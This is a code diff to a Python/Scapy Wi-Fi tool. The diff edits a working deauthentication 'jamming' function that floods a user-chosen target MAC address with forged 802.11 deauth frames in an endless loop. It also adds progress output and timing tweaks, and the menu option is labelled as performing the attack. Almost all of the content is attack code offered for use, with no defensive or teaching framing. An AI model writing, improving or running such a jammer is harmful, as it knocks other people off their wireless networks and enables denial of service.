@@ -15,13 +15,16 @@ def scan_wifi_info(pkt):
 def jam_network(interface, target_mac):
     while True:
         # Craft the deauthentication packet
-        deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff") / Dot11Deauth(reason=7)
+        deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3=target_mac) / Dot11Deauth(reason=7)
 
         # Send the packet repeatedly to jam the target
-        for _ in range(100):
+        for i in range(100):
             sendp(deauth_packet, iface=interface, verbose=False)
+            print(f"Sent {i+1} packets", end="\r")  # Print the progress
+            time.sleep(0.05)  # Adjust the sleep time as needed
 
         # Pause for a moment before sending more deauth packets
+        print("\nWaiting for the next round of deauthentication...")
         time.sleep(5)
 
 # Main function
@@ -46,7 +49,8 @@ def main():
             # Set the target's MAC address
             target_mac = input("Insert Target's MAC Address: ")
 
-            # Perform deauthentication attack
+            # Perform deauthentication attack with progress bar
+            print("Jamming in progress:")
             jam_network(interface, target_mac)
         elif choice == '3':
             print("Exiting the program.")
